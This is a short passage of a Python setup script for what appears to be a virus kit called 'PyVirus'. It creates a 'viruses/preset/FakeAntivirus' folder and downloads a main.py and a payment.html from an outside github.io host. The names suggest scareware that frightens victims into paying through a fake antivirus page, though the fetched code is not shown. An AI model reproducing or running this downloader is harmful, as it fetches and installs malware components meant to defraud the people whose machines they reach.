...
if not os.path.isdir("viruses/preset/FakeAntivirus"):
 os.mkdir("viruses/preset/FakeAntivirus")
print("directories created")
print("downloading files")
try:
 download_file("https://pyvirus123.github.io/PyVirus/viruses/preset/FakeAntivirus/main.py", "viruses/preset/FakeAntivirus/main.py")
 download_file("https://pyvirus123.github.io/PyVirus/viruses/preset/FakeAntivirus/payment.html", "viruses/preset/FakeAntivirus/payment.html")
except:
